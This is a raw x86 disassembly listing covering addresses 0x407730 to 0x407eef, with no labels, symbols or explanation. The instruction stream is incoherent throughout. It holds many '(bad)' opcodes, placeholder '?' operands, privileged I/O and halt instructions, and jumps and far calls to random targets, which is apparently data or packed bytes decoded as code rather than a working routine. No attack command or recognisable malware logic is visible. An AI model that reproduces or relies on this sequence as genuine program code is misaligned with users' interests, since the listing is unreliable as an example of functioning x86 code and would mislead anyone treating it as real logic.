  407730:	lea    esi,[eax]
  407732:	lock mov ds:0x2b9bd8c3,al
  407738:	sbb    ch,BYTE PTR [edi+eiz*4]
  40773b:	cwde   
  40773c:	sbb    al,0x49
  40773e:	aas    
  40773f:	xchg   BYTE PTR [edx],ah
  407741:	adc    BYTE PTR [eax-0x2e],cl
  407744:	jnp    0x407711
  407746:	loope  0x40773b
  407748:	push   eax
  407749:	and    dl,0xd1
  40774c:	mov    edi,0x788cd46d
  407751:	clc    
  407752:	loop   0x407741
  407754:	dec    esp
  407755:	fs pop edx
  407757:	bound  ebp,QWORD PTR [ebx+0xf560540]
  40775d:	ret    
  40775e:	jo     0x40779a
  407760:	pop    esi
  407761:	jnp    0x4077b2
  407763:	enter  0x95ba,0x48
  407767:	mov    ?,WORD PTR [ebx]
  407769:	sub    DWORD PTR es:[edx-0x42],ecx
  40776d:	rol    DWORD PTR [eax-0x5eca1873],1
  407773:	pop    ebx
  407774:	mov    ds:0xec5eb576,eax
  407779:	inc    edi
  40777a:	mov    eax,ds:0x524a1f9d
  40777f:	push   eax
  407780:	mov    ebp,0xf0f35d91
  407785:	xchg   edi,eax
  407786:	hlt    
  407787:	(bad)  
  407788:	cdq    
  407789:	fisubr WORD PTR [ebx+0x4c]
  40778c:	popa   
  40778d:	loop   0x407757
  40778f:	jns    0x40772f
  407791:	lock or edx,DWORD PTR [ecx+ebx*8]
  407795:	call   0x37967bc3
  40779a:	adc    al,0xe3
  40779c:	ret    0x1ecd
  40779f:	imul   ebx,DWORD PTR [edi-0x72ce73fe],0xaf2982d2
  4077a9:	sub    BYTE PTR [eax-0x18],ah
  4077ac:	push   esp
  4077ad:	cmp    eax,0x1b34c278
  4077b2:	adc    DWORD PTR [eax],eax
  4077b4:	cmp    bh,bl
  4077b6:	inc    ecx
  4077b7:	pop    eax
  4077b8:	retf   
  4077b9:	imul   esi,ecx,0x30
  4077bc:	stc    
  4077bd:	mov    edx,0xdee4f194
  4077c2:	sbb    ch,dh
  4077c4:	xchg   ebp,eax
  4077c5:	push   ds
  4077c6:	mov    WORD PTR [edi],cs
  4077c8:	cmp    edx,DWORD PTR [esi]
  4077ca:	(bad)  
  4077cb:	inc    BYTE PTR [eax+0x605b2c81]
  4077d1:	sti    
  4077d2:	cmp    ah,ch
  4077d4:	in     eax,dx
  4077d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077d6:	xchg   edi,eax
  4077d7:	test   DWORD PTR [edx],ebp
  4077d9:	xor    esi,esi
  4077db:	push   ebp
  4077dc:	or     al,0xf1
  4077de:	push   ds
  4077df:	call   0x55acc445
  4077e4:	stos   BYTE PTR es:[edi],al
  4077e5:	pop    es
  4077e6:	inc    eax
  4077e7:	lahf   
  4077e8:	mov    ds:0x2fb30ff8,al
  4077ed:	add    BYTE PTR [eax+0x2f],dh
  4077f0:	(bad)  
  4077f1:	mov    al,ds:0xe1584b79
  4077f6:	inc    edi
  4077f7:	ja     0x407803
  4077f9:	push   es
  4077fa:	cmp    BYTE PTR ds:0x41637a6e,ah
  407800:	out    0x12,al
  407802:	shl    DWORD PTR [esi+eiz*4-0x37],cl
  407806:	rol    DWORD PTR [edi],1
  407808:	xor    al,0xcf
  40780a:	inc    ecx
  40780b:	inc    eax
  40780c:	push   ecx
  40780d:	aas    
  40780e:	sub    bh,BYTE PTR [eax-0x69]
  407811:	jne    0x40783d
  407813:	gs out 0x91,al
  407816:	xchg   ebp,eax
  407817:	xor    bl,ch
  407819:	addr16 mov al,ds:0x9e96
  40781d:	in     eax,dx
  40781e:	xchg   edi,eax
  40781f:	fst    QWORD PTR [ebx-0x758b6f71]
  407825:	mov    esp,0x98dd4a4f
  40782a:	jnp    0x40781c
  40782c:	in     eax,dx
  40782d:	sub    bl,dl
  40782f:	sahf   
  407830:	or     al,0xf3
  407832:	push   ds
  407833:	xor    eax,DWORD PTR [edx]
  407835:	push   ds
  407836:	jno    0x4077e0
  407838:	or     ecx,DWORD PTR [ebp+0x2f528647]
  40783e:	sbb    DWORD PTR [edi],edx
  407840:	imul   esp,DWORD PTR [ebx-0x15],0x7b234686
  407847:	iret   
  407848:	pop    esi
  407849:	das    
  40784a:	pop    esi
  40784b:	sub    bl,BYTE PTR [ecx]
  40784d:	pushf  
  40784e:	dec    ebp
  40784f:	xor    esi,edx
  407851:	cmp    esp,DWORD PTR [eax+0x65aa9676]
  407857:	je     0x407840
  407859:	ins    BYTE PTR es:[edi],dx
  40785a:	fs push esp
  40785c:	iret   
  40785d:	ds xor al,0xbe
  407860:	and    al,0x7d
  407862:	lods   al,BYTE PTR ds:[esi]
  407863:	push   esi
  407864:	xchg   ebp,eax
  407865:	enter  0x6d49,0x62
  407869:	(bad)  
  40786a:	push   ebx
  40786b:	add    eax,0x90a7e0c0
  407870:	mov    ecx,0x3bccb7ca
  407875:	or     al,0xa
  407877:	push   edx
  407878:	fsubrp st(2),st
  40787a:	inc    ecx
  40787b:	add    dh,BYTE PTR [esi-0xfbf7a52]
  407881:	loopne 0x407806
  407883:	(bad)  
  407884:	adc    esp,edi
  407886:	cmp    al,0xcc
  407888:	mov    edx,0xeb66d680
  40788d:	sbb    BYTE PTR [edx+0x42b14830],bl
  407893:	sub    BYTE PTR [ecx+0x5a],dl
  407896:	imul   edi,ebx,0x2f4d0760
  40789c:	mov    WORD PTR [esi-0x41],?
  40789f:	sub    BYTE PTR [ecx-0x2899a253],bh
  4078a5:	outs   dx,BYTE PTR ds:[esi]
  4078a6:	jo     0x407923
  4078a8:	xchg   esi,eax
  4078a9:	cdq    
  4078aa:	retf   0x27b
  4078ad:	mov    DWORD PTR [esi-0x49cf8198],ecx
  4078b3:	stos   BYTE PTR es:[edi],al
  4078b4:	add    BYTE PTR [ecx],0x2f
  4078b7:	or     eax,0x56466af9
  4078bc:	iret   
  4078bd:	fisub  DWORD PTR [eax]
  4078bf:	jp     0x4078f2
  4078c1:	mov    al,ds:0xa2be4765
  4078c6:	xchg   DWORD PTR [edx],ebp
  4078c8:	(bad)  
  4078c9:	sub    edx,DWORD PTR [edx+0x4e]
  4078cc:	(bad)  
  4078cd:	fbstp  TBYTE PTR [ebx]
  4078cf:	gs pop ebx
  4078d1:	add    DWORD PTR [ecx+0x10221f7e],0xd0ecb69c
  4078db:	in     al,0xf2
  4078dd:	lahf   
  4078de:	cdq    
  4078df:	rcr    BYTE PTR [edx],0x97
  4078e2:	adc    eax,0x6af6a43
  4078e7:	push   esp
  4078e8:	aad    0xae
  4078ea:	data16 cld 
  4078ec:	cmc    
  4078ed:	mov    gs,WORD PTR [ebx]
  4078ef:	sub    eax,0x2b6c5d8e
  4078f4:	pop    esp
  4078f5:	scas   al,BYTE PTR es:[edi]
  4078f6:	add    edi,DWORD PTR [edx]
  4078f8:	rol    BYTE PTR [ebp+0x5edfa076],cl
  4078fe:	pop    ss
  4078ff:	repnz stc 
  407901:	pop    ecx
  407902:	das    
  407903:	dec    eax
  407904:	pop    ss
  407905:	jmp    0x40788b
  407907:	dec    edx
  407908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407909:	ret    0x26da
  40790c:	mov    esi,0xc8cf75b2
  407911:	xchg   ebp,eax
  407912:	cs sbb ebx,ecx
  407915:	mov    al,BYTE PTR ds:0x5b5f5df7
  40791b:	das    
  40791c:	cld    
  40791d:	cld    
  40791e:	push   esp
  40791f:	mov    edx,0xa167d51d
  407924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407925:	adc    al,0x16
  407927:	into   
  407928:	jle    0x407903
  40792a:	test   eax,0x660f9af0
  40792f:	xor    DWORD PTR [esi],0xffffff8c
  407932:	ror    DWORD PTR [esi],0x7b
  407935:	aad    0x65
  407937:	sbb    edx,ecx
  407939:	addr16 call 0xc330:0xf2f5064c
  407941:	stc    
  407942:	out    dx,al
  407943:	xchg   edx,eax
  407944:	enter  0xd89a,0xd6
  407948:	pop    es
  407949:	pop    ecx
  40794a:	iret   
  40794b:	jae    0x4079bf
  40794d:	int    0xdf
  40794f:	popa   
  407950:	ret    0xca91
  407953:	pop    edi
  407954:	push   cs
  407955:	jno    0x407931
  407957:	adc    al,cl
  407959:	cmc    
  40795a:	or     edx,ebx
  40795c:	jmp    0x4079d8
  40795e:	jle    0x407973
  407960:	call   0xb0e7b18
  407965:	retf   
  407966:	xchg   ebx,eax
  407967:	lods   al,BYTE PTR ds:[esi]
  407969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40796a:	adc    DWORD PTR [ecx-0x451940d6],eax
  407970:	dec    ebx
  407971:	sar    esi,1
  407973:	pop    ds
  407974:	jmp    0x40793e
  407976:	or     eax,0xa68bb2ba
  40797b:	sbb    ebp,esp
  40797d:	dec    ebp
  40797e:	(bad)  
  407980:	pop    ss
  407981:	shr    DWORD PTR [edi],0x3d
  407984:	and    ah,BYTE PTR [edx+0x33]
  407987:	mov    edx,0xf22a1389
  40798c:	sub    al,0xbc
  40798e:	xchg   edi,eax
  40798f:	inc    eax
  407990:	or     BYTE PTR [eax+0xda21374],bl
  407996:	int3   
  407997:	call   0xbdef79d3
  40799c:	cmp    BYTE PTR [edi-0x5f88753f],0x4
  4079a3:	addr16 call 0xbd79a253
  4079a9:	jge    0x4079bc
  4079ab:	adc    al,0x10
  4079ad:	push   esi
  4079ae:	fwait
  4079af:	call   0xc3c1:0xd6cd317b
  4079b6:	or     DWORD PTR [ecx+edx*2],ecx
  4079b9:	pop    ebp
  4079ba:	in     al,dx
  4079bb:	bound  edi,QWORD PTR [edx+0x17]
  4079be:	xor    BYTE PTR [eax],cl
  4079c0:	jno    0x40795f
  4079c2:	cmp    al,0xd4
  4079c4:	jl     0x4079d3
  4079c6:	ins    BYTE PTR es:[edi],dx
  4079c7:	inc    ecx
  4079c8:	sbb    eax,DWORD PTR [ebx-0x68287d58]
  4079ce:	pop    eax
  4079cf:	leave  
  4079d0:	inc    ebp
  4079d1:	dec    ebp
  4079d2:	test   al,bh
  4079d4:	rcl    BYTE PTR [eax+0x1dff6780],1
  4079da:	hlt    
  4079db:	xchg   esp,eax
  4079dc:	fwait
  4079dd:	cwde   
  4079de:	ficom  WORD PTR ds:0xb033624e
  4079e4:	pop    ds
  4079e5:	inc    edx
  4079e6:	mov    ebp,0xa80cd9a0
  4079eb:	scas   eax,DWORD PTR es:[edi]
  4079ec:	loope  0x40797c
  4079ee:	mov    edx,0xc99c502
  4079f3:	mov    ecx,0x43a70c7
  4079f8:	pop    esi
  4079f9:	mov    al,ds:0x7f8323ef
  4079fe:	out    0x81,eax
  407a00:	cld    
  407a01:	rcr    DWORD PTR [esi],cl
  407a03:	test   DWORD PTR [edi],ebp
  407a05:	mov    dh,0x33
  407a07:	inc    esi
  407a08:	shl    BYTE PTR [eax+0x3b],1
  407a0b:	js     0x4079bf
  407a0d:	adc    esp,DWORD PTR [eax+0x4a649d18]
  407a13:	mov    bl,0xf3
  407a15:	popa   
  407a16:	jns    0x4079c1
  407a18:	lea    di,[eax-0x70]
  407a1c:	push   ds
  407a1d:	and    al,0x68
  407a1f:	stos   DWORD PTR es:[edi],eax
  407a20:	les    esp,FWORD PTR [esi+0x6d]
  407a23:	invd   
  407a25:	aad    0x7a
  407a27:	or     ecx,ebp
  407a29:	add    al,0xfb
  407a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a2c:	or     DWORD PTR [edx],eax
  407a2e:	and    al,ch
  407a30:	xor    WORD PTR [ebx+edx*8-0x6715b797],si
  407a38:	dec    ebp
  407a39:	mov    ds:0xc89f93be,al
  407a3e:	test   BYTE PTR [eax+ebx*4+0x60a88908],dl
  407a45:	xor    al,0x77
  407a47:	mov    al,0xfd
  407a49:	aad    0xda
  407a4b:	jno    0x407a85
  407a4d:	jmp    0x4336bdb8
  407a52:	jns    0x407a88
  407a54:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407a56:	jg     0x407ad7
  407a58:	in     al,dx
  407a59:	or     al,0x93
  407a5b:	or     DWORD PTR [ecx-0x5c0f9a01],ecx
  407a61:	lock add DWORD PTR [ebp-0x6db17c7c],0xa4a5773f
  407a6c:	js     0x407acf
  407a6e:	push   esi
  407a6f:	or     ch,dl
  407a71:	lock or BYTE PTR [ecx],ah
  407a74:	push   0xffffff98
  407a76:	xchg   ebx,eax
  407a77:	sub    al,0x7d
  407a79:	mov    al,ah
  407a7b:	je     0x407aa5
  407a7d:	lods   eax,DWORD PTR ds:[esi]
  407a7e:	test   eax,0xfc4969a5
  407a83:	pop    eax
  407a84:	clc    
  407a85:	lea    ecx,[ebp+eiz*8+0x156e94ef]
  407a8c:	adc    DWORD PTR [ebx-0x6f239cdd],ebp
  407a92:	mov    ch,0xdf
  407a94:	test   dl,ah
  407a96:	stc    
  407a97:	int    0x6d
  407a99:	ins    BYTE PTR es:[edi],dx
  407a9a:	fsub   DWORD PTR [ecx]
  407a9c:	mov    ah,0x1c
  407a9e:	rcr    BYTE PTR [ebp+eiz*1-0x8],1
  407aa2:	mov    cl,0x15
  407aa4:	not    DWORD PTR [edx]
  407aa6:	sbb    eax,0xad268884
  407aab:	pop    ds
  407aac:	push   es
  407aad:	out    0x83,al
  407aaf:	cli    
  407ab0:	sar    BYTE PTR [edx+0x42],1
  407ab3:	(bad)  
  407ab4:	cs stos DWORD PTR es:[edi],eax
  407ab6:	pop    ds
  407ab7:	fldenv [ebp-0xa]
  407aba:	sar    DWORD PTR [eax-0x16],0x6a
  407abe:	shl    DWORD PTR [ebx],1
  407ac0:	rcl    BYTE PTR [edi-0x2ee3fc17],0xf0
  407ac7:	xor    cl,BYTE PTR ds:0x8b22e2bb
  407acd:	cmp    ecx,DWORD PTR [esi+eax*8]
  407ad0:	daa    
  407ad1:	ficomp DWORD PTR [edi+0x2e]
  407ad4:	outs   dx,BYTE PTR ds:[esi]
  407ad5:	mov    DWORD PTR [edx+ecx*8-0x3f51cbae],edi
  407adc:	dec    ebp
  407add:	mov    ds:0x2041894e,eax
  407ae2:	(bad)  
  407ae3:	cld    
  407ae4:	cli    
  407ae5:	enter  0x993,0xdb
  407ae9:	mov    eax,ds:0x47f3494d
  407aee:	int    0x14
  407af0:	mov    ch,0x6c
  407af2:	dec    ecx
  407af3:	scas   eax,DWORD PTR es:[edi]
  407af4:	sub    BYTE PTR [esi+esi*8+0x4],cl
  407af8:	pusha  
  407af9:	call   FWORD PTR [ebp+0x6b]
  407afc:	das    
  407afd:	test   al,0x98
  407aff:	jnp    0x407b38
  407b01:	sar    al,0xd1
  407b04:	lock outs dx,BYTE PTR ds:[esi]
  407b06:	xchg   ebp,eax
  407b07:	pushf  
  407b08:	cmp    edx,DWORD PTR [eax-0x479cb00e]
  407b0e:	jnp    0x407b4c
  407b10:	sbb    esp,DWORD PTR [ecx+0x288ddb37]
  407b16:	dec    edi
  407b17:	ins    DWORD PTR es:[edi],dx
  407b18:	lock and al,0xab
  407b1b:	mov    cl,0xd
  407b1d:	jle    0x407abc
  407b1f:	jmp    0x407b56
  407b21:	dec    ebx
  407b22:	(bad)  
  407b23:	jg     0x407b02
  407b25:	hlt    
  407b26:	stos   DWORD PTR es:[edi],eax
  407b27:	ret    0xa0b0
  407b2a:	and    DWORD PTR [edx],ecx
  407b2c:	fsub   st(6),st
  407b2e:	jae    0x407b05
  407b30:	xchg   esi,eax
  407b31:	popa   
  407b32:	lods   eax,DWORD PTR ds:[esi]
  407b33:	jae    0x407ae7
  407b35:	inc    BYTE PTR [ebx]
  407b37:	xchg   edi,eax
  407b38:	jmp    0x407b0b
  407b3a:	mov    eax,0x5f35e66
  407b3f:	push   0x6385e12b
  407b44:	mov    ecx,0x771ada81
  407b49:	dec    eax
  407b4a:	daa    
  407b4b:	(bad)  
  407b4c:	and    BYTE PTR [ebp-0x1e],ah
  407b4f:	cli    
  407b50:	retf   
  407b51:	outs   dx,DWORD PTR ds:[esi]
  407b52:	rol    esp,1
  407b54:	pusha  
  407b55:	in     eax,dx
  407b56:	jecxz  0x407b69
  407b58:	jmp    0xac555e44
  407b5d:	stos   DWORD PTR es:[edi],eax
  407b5e:	sti    
  407b5f:	movaps xmm6,XMMWORD PTR [esi]
  407b62:	loop   0x407b8c
  407b64:	out    0xdd,eax
  407b66:	and    edi,DWORD PTR [edi]
  407b68:	mov    gs,ebp
  407b6a:	inc    edx
  407b6b:	mov    WORD PTR [eax-0x33d1a6c8],ss
  407b71:	(bad)  
  407b72:	jno    0x407be4
  407b74:	rcr    DWORD PTR [ebp-0x73],1
  407b77:	vaddps ymm1,ymm2,YMMWORD PTR [ebx+edi*1]
  407b7c:	sub    dl,BYTE PTR [ecx-0x20]
  407b7f:	push   0xffffffe7
  407b81:	mov    ecx,0x1bac2a7c
  407b86:	mov    esp,0xc6d754b4
  407b8b:	(bad)  
  407b8c:	int3   
  407b8d:	into   
  407b8e:	and    dh,BYTE PTR [esi+0x78770842]
  407b94:	mov    esi,DWORD PTR [edx]
  407b96:	xchg   esi,eax
  407b97:	mov    fs,edi
  407b99:	fidiv  DWORD PTR [ebp+0x61bccfa1]
  407b9f:	add    BYTE PTR [edi],cl
  407ba1:	stc    
  407ba2:	jnp    0x407b96
  407ba4:	fwait
  407ba5:	mov    DWORD PTR ds:0x54134cde,edx
  407bab:	int3   
  407bac:	jb     0x407b4d
  407bae:	dec    eax
  407baf:	(bad)  
  407bb0:	xchg   ecx,eax
  407bb1:	sbb    bh,0x91
  407bb4:	(bad)  
  407bb6:	mov    cl,0x6f
  407bb8:	jle    0x407ba5
  407bba:	das    
  407bbb:	rcr    BYTE PTR [eax-0x48c5f519],0xf6
  407bc2:	popa   
  407bc3:	mov    ch,0x30
  407bc5:	rcl    DWORD PTR [esp+ebx*2-0x7fb1184e],cl
  407bcc:	mov    esi,ds
  407bce:	pusha  
  407bcf:	xor    bh,BYTE PTR [edx-0x15]
  407bd2:	fistp  DWORD PTR [esi-0x4c6e1ca7]
  407bd8:	enter  0x6c24,0x3a
  407bdc:	or     eax,0x33cde8f1
  407be1:	pop    edx
  407be2:	arpl   WORD PTR [eax-0x3ca1786c],sp
  407be8:	dec    edi
  407be9:	mov    dl,0x22
  407beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bec:	mov    dl,0x40
  407bee:	daa    
  407bef:	push   esi
  407bf0:	(bad)  
  407bf1:	fwait
  407bf2:	jg     0x407c08
  407bf4:	jmp    0x66d9:0xb4a1fbb2
  407bfb:	xor    ch,BYTE PTR [ebx-0x4ec96f4f]
  407c01:	imul   ebp,DWORD PTR [edi+0x63],0xffffff90
  407c05:	adc    bh,al
  407c07:	aas    
  407c08:	fcmovnb st,st(2)
  407c0a:	loop   0x407c8a
  407c0c:	add    edx,DWORD PTR [edx+eax*8+0x1400aed5]
  407c13:	nop
  407c14:	mov    bl,0x67
  407c16:	mov    ah,0x37
  407c18:	xor    eax,DWORD PTR [edi-0x26]
  407c1b:	and    BYTE PTR [ecx],cl
  407c1d:	sbb    al,0x74
  407c1f:	and    DWORD PTR [ebp+0x7],0x1
  407c23:	push   es
  407c24:	add    eax,0xe5b503e6
  407c29:	daa    
  407c2a:	scas   eax,DWORD PTR es:[edi]
  407c2b:	in     eax,dx
  407c2c:	xchg   esp,eax
  407c2d:	aas    
  407c2e:	jne    0x407c1f
  407c30:	(bad)  
  407c32:	fnstsw WORD PTR [ebp+0xec6cda3]
  407c38:	imul   ebp,DWORD PTR [edi],0x75
  407c3b:	xor    eax,0x70291b2e
  407c40:	jae    0x407ca3
  407c42:	ret    
  407c43:	mov    al,ds:0x5dccd2ed
  407c48:	out    dx,al
  407c49:	mov    bl,0xa6
  407c4b:	inc    eax
  407c4c:	xchg   ecx,eax
  407c4d:	pop    ds
  407c4e:	mov    ds:0x81095ea9,eax
  407c53:	or     eax,DWORD PTR [ebx]
  407c55:	cwde   
  407c56:	(bad)  
  407c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c58:	xchg   esi,eax
  407c59:	inc    edx
  407c5a:	gs mov edi,0xd5622e87
  407c60:	mov    ah,BYTE PTR [eax+0x5f466ae3]
  407c66:	push   0xffffffd7
  407c68:	enter  0x731e,0xf5
  407c6c:	mov    al,ds:0x60818e22
  407c71:	inc    BYTE PTR [ebx]
  407c73:	xor    eax,0x7c6a9643
  407c78:	dec    eax
  407c79:	in     eax,dx
  407c7a:	(bad)  
  407c7c:	retf   0x4b16
  407c7f:	xlat   BYTE PTR ds:[ebx]
  407c80:	adc    al,BYTE PTR [eax+0x1c]
  407c83:	fmul   QWORD PTR [eax-0x6470f560]
  407c89:	in     eax,0x97
  407c8b:	sbb    DWORD PTR [ebx-0x3b0065a4],eax
  407c91:	mov    ds:0x81f1fecb,eax
  407c96:	sub    eax,0xebb5c678
  407c9b:	sbb    DWORD PTR [eax-0x62],edx
  407c9e:	jnp    0x407c58
  407ca0:	ss int3 
  407ca2:	sub    esi,ebx
  407ca4:	xor    eax,0xeab2f6b9
  407ca9:	leave  
  407caa:	stos   BYTE PTR es:[edi],al
  407cab:	lahf   
  407cac:	bsf    edi,DWORD PTR [edi+0x65]
  407cb0:	and    dl,BYTE PTR [ecx+0xbe0b1ef]
  407cb6:	gs repz test cl,ah
  407cba:	dec    eax
  407cbb:	cmp    DWORD PTR [eax-0x5ff0eabe],ebx
  407cc1:	test   BYTE PTR [eax-0x7d211f30],bl
  407cc7:	mov    gs,WORD PTR [edx+ebp*2-0x62]
  407ccb:	jne    0x407cda
  407ccd:	inc    ebx
  407cce:	test   al,0x41
  407cd0:	mov    ds:0x1ff44347,eax
  407cd5:	jmp    0x407d40
  407cd7:	cmc    
  407cd8:	push   ecx
  407cd9:	sub    eax,0x4d20e065
  407cde:	hlt    
  407cdf:	push   ss
  407ce0:	rol    dl,0x94
  407ce3:	lods   eax,DWORD PTR ds:[esi]
  407ce4:	(bad)  
  407ce6:	xchg   ecx,eax
  407ce7:	mov    ebp,0xf7adf5cb
  407cec:	sub    ch,cl
  407cee:	add    ch,BYTE PTR [ebx+0x2f3ce006]
  407cf4:	push   0x16
  407cf6:	das    
  407cf7:	xchg   BYTE PTR [eax],ch
  407cf9:	jl     0x407cad
  407cfb:	loop   0x407d2d
  407cfd:	in     eax,0xdf
  407cff:	shr    dl,0x9e
  407d02:	cmc    
  407d03:	outs   dx,DWORD PTR ds:[esi]
  407d04:	cmc    
  407d05:	and    al,0xf1
  407d07:	daa    
  407d08:	scas   al,BYTE PTR es:[edi]
  407d09:	daa    
  407d0a:	dec    eax
  407d0b:	push   edx
  407d0c:	mov    al,ds:0xd8c8d303
  407d11:	ja     0x407d5e
  407d13:	jge    0x407cc3
  407d15:	sbb    bl,BYTE PTR [ebx+0x2837f8cd]
  407d1b:	stos   BYTE PTR es:[edi],al
  407d1c:	sub    BYTE PTR [edx+0x4a],bl
  407d1f:	arpl   WORD PTR ds:0xafdaaffd,bx
  407d25:	or     ecx,DWORD PTR [esi]
  407d27:	in     eax,dx
  407d28:	and    eax,0xf156a22
  407d2d:	jns    0x407d8b
  407d2f:	push   edx
  407d30:	mov    edx,0x63339965
  407d35:	dec    edx
  407d36:	pop    esi
  407d37:	jbe    0x407d14
  407d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d3a:	push   ss
  407d3b:	and    al,0xce
  407d3d:	fxch   st(3)
  407d3f:	inc    eax
  407d40:	shl    dh,0x47
  407d43:	push   es
  407d44:	cld    
  407d45:	hlt    
  407d46:	stos   BYTE PTR es:[edi],al
  407d47:	pop    ebx
  407d48:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d4a:	jnp    0x407d2a
  407d4c:	sti    
  407d4d:	out    0xaa,eax
  407d4f:	addr16 popf 
  407d51:	pop    ecx
  407d52:	dec    edx
  407d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d54:	pop    ebx
  407d55:	icebp  
  407d56:	jmp    0x47f0:0x7dea3e2a
  407d5d:	cwde   
  407d5e:	sbb    al,0x56
  407d60:	inc    ebp
  407d61:	loope  0x407d68
  407d63:	pop    ss
  407d64:	or     al,0xd4
  407d66:	test   esp,ecx
  407d68:	ds push 0x47
  407d6b:	inc    edi
  407d6c:	out    0x57,al
  407d6e:	pop    edi
  407d6f:	push   0x9fc03b90
  407d74:	jmp    0x407d93
  407d76:	retf   
  407d77:	mov    esp,0x1c7405b3
  407d7c:	ins    BYTE PTR es:[edi],dx
  407d7d:	iret   
  407d7e:	gs dec ebp
  407d80:	xchg   esp,eax
  407d81:	daa    
  407d82:	sub    DWORD PTR [eax],edx
  407d84:	xchg   ebp,eax
  407d85:	imul   edi,edi,0x14cf944d
  407d8b:	adc    al,0xdf
  407d8d:	adc    ah,ah
  407d8f:	ja     0x407d9b
  407d91:	test   al,0x62
  407d93:	xor    eax,esp
  407d95:	inc    eax
  407d96:	mov    edx,esi
  407d98:	call   0xd32ec9ce
  407d9d:	sub    BYTE PTR [ebp-0x148b1dfe],bl
  407da3:	xchg   ebx,eax
  407da4:	inc    esp
  407da5:	add    bl,ah
  407da7:	sahf   
  407da8:	fwait
  407da9:	jno    0x407e00
  407dab:	inc    edx
  407dac:	and    dh,BYTE PTR [edx+edx*4-0x73]
  407db0:	pop    esp
  407db1:	test   BYTE PTR [eax+0xf],dl
  407db4:	sbb    edx,DWORD PTR [edx]
  407db6:	mov    ecx,0x2d34f05
  407dbb:	xor    BYTE PTR [ebp-0x6f],al
  407dbe:	jl     0x407d7e
  407dc0:	pusha  
  407dc1:	fist   DWORD PTR [edi+0x46]
  407dc4:	je     0x407d47
  407dc6:	jl     0x407dea
  407dc8:	pushf  
  407dc9:	aaa    
  407dca:	xchg   edi,eax
  407dcb:	adc    DWORD PTR [ebp-0x2e],ebp
  407dce:	jne    0x407d74
  407dd0:	icebp  
  407dd1:	fnstsw WORD PTR [eax]
  407dd3:	or     al,0xf9
  407dd5:	(bad)  
  407dd7:	or     BYTE PTR [edx+esi*2],ah
  407dda:	adc    esi,DWORD PTR [ecx-0x52700edd]
  407de0:	jae    0x407d86
  407de2:	push   ebp
  407de3:	jbe    0x407dbf
  407de5:	les    esi,FWORD PTR [ebp-0x1d]
  407de8:	scas   al,BYTE PTR es:[edi]
  407de9:	cmp    al,0xd7
  407deb:	mov    bh,0x9b
  407ded:	cmp    al,BYTE PTR [edx-0x1547a88a]
  407df3:	sbb    BYTE PTR [ebp+0x38],dl
  407df6:	arpl   bp,bp
  407df8:	add    al,0x35
  407dfa:	mov    ecx,0x91977f8
  407dff:	push   esi
  407e00:	(bad)  
  407e01:	ins    BYTE PTR es:[edi],dx
  407e02:	xchg   ebp,eax
  407e03:	repz jmp 0xca96:0x4da30918
  407e0b:	in     al,dx
  407e0c:	shl    ecx,0x3f
  407e0f:	add    ecx,0x6b
  407e12:	xchg   ecx,eax
  407e13:	sub    al,0xee
  407e15:	cmp    al,0x19
  407e17:	and    al,0x68
  407e19:	or     cl,BYTE PTR [ecx+0x30b5fd96]
  407e1f:	push   ss
  407e20:	sub    eax,0x2e820f50
  407e25:	xchg   esp,eax
  407e26:	nop
  407e27:	aaa    
  407e28:	dec    edx
  407e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e2a:	fdiv   QWORD PTR [ebx]
  407e2c:	pushf  
  407e2d:	xor    DWORD PTR [ebx-0x6901afda],edi
  407e33:	pop    ebp
  407e34:	lea    ebp,[ecx]
  407e36:	and    eax,0xaf4ac1e9
  407e3b:	mov    ds:0xca21ba11,al
  407e40:	pop    esp
  407e41:	mov    BYTE PTR [edx+0x67],0xb2
  407e45:	mov    DWORD PTR [ecx+0x7f71b022],ecx
  407e4b:	nop
  407e4c:	xchg   edx,eax
  407e4d:	sub    eax,0x78a9bcfc
  407e52:	sbb    al,0x47
  407e54:	mov    dl,0x5
  407e57:	test   eax,0x4290c868
  407e5c:	and    eax,0xf2b06a55
  407e61:	aad    0x3e
  407e63:	sub    BYTE PTR [eax],0xb9
  407e66:	std    
  407e67:	pop    ebp
  407e68:	pushf  
  407e69:	lods   al,BYTE PTR ds:[esi]
  407e6a:	push   ecx
  407e6b:	jp     0x407e2a
  407e6d:	stc    
  407e6e:	mov    edx,DWORD PTR [ebp+esi*4-0x7ed9c1c5]
  407e75:	fst    QWORD PTR [esi+0x59c74822]
  407e7b:	mov    ebx,0x32b33929
  407e80:	test   DWORD PTR ds:0x9b413a0c,0x9587397c
  407e8a:	sub    DWORD PTR [ebx+0x1aed280c],esi
  407e90:	aaa    
  407e91:	lock pop edx
  407e93:	fs (bad) 
  407e96:	retf   0xa4da
  407e99:	sbb    eax,0xacb07e01
  407e9e:	add    eax,0xf6a0a34b
  407ea3:	cmp    eax,0x736888d2
  407ea8:	fwait
  407ea9:	push   es
  407eaa:	jne    0x407e3b
  407eac:	lock mov ch,0x11
  407eaf:	add    ecx,DWORD PTR [esi]
  407eb1:	fstp   QWORD PTR [ecx]
  407eb3:	out    0xb8,al
  407eb5:	mov    edi,0x6e860b5b
  407eba:	idiv   edx
  407ebc:	mov    eax,0x6b90a6b6
  407ec1:	retf   
  407ec2:	aas    
  407ec3:	pop    ebp
  407ec4:	add    dl,BYTE PTR [edx+edx*2+0x5185529e]
  407ecb:	int3   
  407ecc:	fninit 
  407ece:	push   esi
  407ecf:	jge    0x407f42
  407ed1:	scas   al,BYTE PTR es:[edi]
  407ed2:	mov    bl,0x86
  407ed4:	les    esi,FWORD PTR [eax]
  407ed6:	sub    cl,dh
  407ed8:	add    cl,BYTE PTR [edx-0x502eeee2]
  407ede:	ror    DWORD PTR [bx+si],cl
  407ee1:	jnp    0x407f0f
  407ee3:	in     eax,0x16
  407ee5:	mov    eax,0x84415710
  407eea:	sbb    eax,0x5e19d560
  407eef:	mov    esi,esi
